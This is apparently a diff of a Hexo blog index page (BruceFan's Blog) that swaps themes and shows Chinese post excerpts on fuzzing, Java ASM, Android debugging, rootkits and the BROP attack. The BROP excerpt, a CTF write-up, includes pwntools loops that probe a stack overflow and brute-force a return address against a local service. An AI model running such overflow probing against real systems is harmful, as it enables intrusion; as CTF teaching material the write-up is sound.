@@ -1,92 +1,207 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-Hans">
 <head>
-  <meta charset="utf-8">
-  
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
   <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="BruceFan&#39;s Blog">
 <meta property="og:url" content="http://example.com/page/9/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+<meta property="og:site_name" content="BruceFan&#39;s Blog">
+<meta property="og:locale">
+<meta property="article:author" content="Bruce Fan">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
 
-<meta name="generator" content="Hexo 5.2.0"></head>
+<link rel="canonical" href="http://example.com/page/9/">
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>BruceFan's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">BruceFan's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
       
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
   
-    <article id="post-模糊测试基础" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/02/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/" class="article-date">
-  <time datetime="2017-02-22T11:59:53.000Z" itemprop="datePublished">2017-02-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">模糊测试基础</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/02/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/02/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">模糊测试基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2017-02-22 19:59:53" itemprop="dateCreated datePublished" datetime="2017-02-22T19:59:53+08:00">2017-02-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>这篇文章主要是对模糊测试的一个入门级的认识，没有太多干货，主要是一些概念性的东西，为以后深入学习做一点铺垫。<br>用于模糊测试的模糊测试器分为两类：</p>
+          <p>这篇文章主要是对模糊测试的一个入门级的认识，没有太多干货，主要是一些概念性的东西，为以后深入学习做一点铺垫。<br>用于模糊测试的模糊测试器分为两类：</p>
 <ul>
 <li>一类是<code>基于变异（mutation-based）</code>的模糊测试器，这一类测试器通过对已有的数据样本进行变异来创建测试用例</li>
 <li>另一类是<code>基于生成（generation-based）</code>的模糊测试器，该类测试器为被测系统使用的协议或是文件格式建模，基于模型生成输入并据此创建测试用例。</li>
@@ -137,42 +252,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/02/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/" data-id="ckhe7o4ns0066chl7fxrufydf" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-Blind-Return-Oriented-Programming-BROP-Attack攻击实践" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/" class="article-date">
-  <time datetime="2017-02-22T07:46:38.000Z" itemprop="datePublished">2017-02-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/">Blind Return Oriented Programming (BROP) Attack攻击实践</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/" class="post-title-link" itemprop="url">Blind Return Oriented Programming (BROP) Attack攻击实践</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2017-02-22 15:46:38" itemprop="dateCreated datePublished" datetime="2017-02-22T15:46:38+08:00">2017-02-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">攻击原理</a>的全部细节，但是作为这种攻击的入门还是不错的。<br>这道题目没有给二进制文件，只能采用BROP。<br>1.经过测试，当输入字符超过72字节时，程序不会显示<strong>No password, No game</strong>  </p>
+          <p>这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">攻击原理</a>的全部细节，但是作为这种攻击的入门还是不错的。<br>这道题目没有给二进制文件，只能采用BROP。<br>1.经过测试，当输入字符超过72字节时，程序不会显示<strong>No password, No game</strong>  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试栈溢出大小 72</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">200</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;A&#x27;</span> * i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;No password, no game&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure>
 <p>2.假设没有开启PIE，则基地址为<code>0x08048000</code>或<code>0x400000</code>。首先尝试0x08048000，没有任何发现，因此判断系统为64位。<br>构造如下payload爆破，发现当<code>i=0x6bd</code>时，程序会重新开始，判断0x4006bd为main地址。  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x600</span>, <span class="number">0x1000</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x400000</span>+i)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
@@ -190,42 +331,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/" data-id="ckhe7o4kg000schl7dzdw6nza" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-Blind-Return-Oriented-Programming-BROP-Attack攻击原理" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/" class="article-date">
-  <time datetime="2017-02-13T01:15:14.000Z" itemprop="datePublished">2017-02-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">Blind Return Oriented Programming (BROP) Attack攻击原理</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Blind Return Oriented Programming (BROP) Attack攻击原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2017-02-13 09:15:14" itemprop="dateCreated datePublished" datetime="2017-02-13T09:15:14+08:00">2017-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>BROP攻击基于一篇发表在Oakland 2014的论文Hacking Blind，作者是来自Standford的Andrea Bittau，<a target="_blank" rel="noopener" href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">相关paper下载</a>。</p>
+          <p>BROP攻击基于一篇发表在Oakland 2014的论文Hacking Blind，作者是来自Standford的Andrea Bittau，<a target="_blank" rel="noopener" href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">相关paper下载</a>。</p>
 <h2 id="BROP攻击的目标和前提条件"><a href="#BROP攻击的目标和前提条件" class="headerlink" title="BROP攻击的目标和前提条件"></a>BROP攻击的目标和前提条件</h2><p>目标：通过ROP的方法远程攻击某个应用程序，劫持该应用程序的控制流。我们可以不需要知道该应用程序的源代码或者任何二进制代码，该应用程序可以被现有的一些保护机制如NX, ASLR, PIE, 以及stack canary等保护，应用程序所在的服务器可以是32位系统或者64位系统。<br>初看这个目标感觉实现起来特别困难。其实这个攻击有两个前提条件的：</p>
 <ul>
 <li>必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞；</li>
@@ -293,42 +460,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/" data-id="ckhe7o4kf000qchl7bh17gqot" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-JAVA-ASM字节码框架" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/02/07/JAVA-ASM%E5%AD%97%E8%8A%82%E7%A0%81%E6%A1%86%E6%9E%B6/" class="article-date">
-  <time datetime="2017-02-07T03:30:39.000Z" itemprop="datePublished">2017-02-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/07/JAVA-ASM%E5%AD%97%E8%8A%82%E7%A0%81%E6%A1%86%E6%9E%B6/">JAVA ASM字节码框架</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/02/07/JAVA-ASM%E5%AD%97%E8%8A%82%E7%A0%81%E6%A1%86%E6%9E%B6/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/02/07/JAVA-ASM%E5%AD%97%E8%8A%82%E7%A0%81%E6%A1%86%E6%9E%B6/" class="post-title-link" itemprop="url">JAVA ASM字节码框架</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2017-02-07 11:30:39" itemprop="dateCreated datePublished" datetime="2017-02-07T11:30:39+08:00">2017-02-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p><a target="_blank" rel="noopener" href="http://asm.ow2.org/">ASM</a>是一款基于JAVA字节码层面的代码分析和修改工具；无需提供源代码即可对应用增添所需的Debug代码。用于应用API性能分析，代码优化和代码混淆等工作。ASM的目标是生成，转换和分析已编译的JAVA class文件，可使用ASM工具读、写、转换JVM指令集。<br>ASM工具提供两种方式来产生和转换已编译的class文件：</p>
+          <p><a target="_blank" rel="noopener" href="http://asm.ow2.org/">ASM</a>是一款基于JAVA字节码层面的代码分析和修改工具；无需提供源代码即可对应用增添所需的Debug代码。用于应用API性能分析，代码优化和代码混淆等工作。ASM的目标是生成，转换和分析已编译的JAVA class文件，可使用ASM工具读、写、转换JVM指令集。<br>ASM工具提供两种方式来产生和转换已编译的class文件：</p>
 <ul>
 <li><code>基于事件的表示模型</code>使用一个有序的事件序列表示一个class文件，class文件中的每一个元素使用一个事件来表示，比如class的头部，变量，方法声明，JVM指令都有相对应的事件表示，ASM使用自带的事件解析器能将每一个class文件解析成一个事件序列。</li>
 <li><code>基于对象的表示模型</code>则使用对象树结构来解析每一个class文件。</li>
@@ -502,42 +695,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/02/07/JAVA-ASM%E5%AD%97%E8%8A%82%E7%A0%81%E6%A1%86%E6%9E%B6/" data-id="ckhe7o4oh007nchl7fb3rfo91" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-Android无源码调试" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" class="article-date">
-  <time datetime="2017-01-10T07:53:24.000Z" itemprop="datePublished">2017-01-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/">Android无源码调试</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">Android无源码调试</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2017-01-10 15:53:24" itemprop="dateCreated datePublished" datetime="2017-01-10T15:53:24+08:00">2017-01-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>前几天通过从网上查阅相关资料，大体了解了一些Android无源码调试的方法，本文主要总结无源码调试的三种方法：</p>
+          <p>前几天通过从网上查阅相关资料，大体了解了一些Android无源码调试的方法，本文主要总结无源码调试的三种方法：</p>
 <ul>
 <li>smalidea + Android Studio</li>
 <li>IDA</li>
@@ -578,42 +797,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" data-id="ckhe7o4k4000dchl77ubta8bi" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-Rootkit技术（一）从syscall到hook" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/" class="article-date">
-  <time datetime="2017-01-04T07:44:45.000Z" itemprop="datePublished">2017-01-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/">Rootkit技术（一）从syscall到hook</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
